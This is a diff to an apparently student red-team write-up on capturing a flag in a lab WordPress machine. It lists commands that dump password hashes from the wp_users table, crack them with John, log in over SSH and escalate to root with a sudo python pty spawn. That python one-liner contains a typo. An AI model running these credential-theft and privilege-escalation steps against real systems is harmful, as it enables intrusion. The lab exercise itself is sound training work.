@@ -63,9 +63,14 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
   - `flag4.txt`: 
   - ![alt text](https://github.com/Rkelley6045/FinalProject/blob/main/Flags/Flag_4.png "Flag 4")    
     - **Exploit Used**
-      - Accessed the WordPress database to abstract the user pw hashes (wp_users table) for both users (Michael and Steven). Exfiltrated the password hashes and ran them agains the password cracker John. 
+      - Accessed the WordPress database to abstract the user pw hashes (wp_users table) for both users (Michael and Steven). Exfiltrated the password hashes and ran them against the password cracker John. Secured a user shell under the user Steven, checked user priviledges, ran a python command to escalate to root, and obtain Flag 4 in the root home directory.
       - Command run: use wordpress;      
       - Command run: show tables;
       - Command run: select * from wp_users;
-      - Command run: SELECT user_pass FROM wp_users INTO OUTFILE '/home/wp_hases.txt';                  
+      - Command run: SELECT user_pass FROM wp_users INTO OUTFILE '/home/wp_hashes.txt';
+      - Command run: john wp_hashes.txt 'from root user on Kali'
+      - Command run: ssh Michael@192.168.1.110
+      - Command run: su steven
+      - Command run: sudo -l
+      - Command run: sudo python -c 'import pty:pty.spawn("/bin/bash")'                       
        
